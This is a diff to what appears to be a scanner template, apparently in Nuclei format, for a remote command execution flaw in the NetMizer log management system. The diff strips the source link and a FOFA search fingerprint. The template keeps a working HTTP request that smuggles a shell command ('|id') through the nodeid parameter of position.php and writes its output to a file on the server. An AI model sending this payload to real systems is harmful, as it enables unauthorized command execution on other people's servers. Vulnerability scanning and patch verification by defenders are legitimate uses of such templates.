@@ -3,12 +3,8 @@ info:
   name: NetMizer 日志管理系统前台RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/he8wl8xdpqyun13c'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: he8wl8xdpqyun13c
-    fofa: title="NetMizer 日志管理系统"
 http:
 - raw:
   - 'GET /data/search/position.php?action=file&nodeid=|id%3Edudesite.txt HTTP/1.1
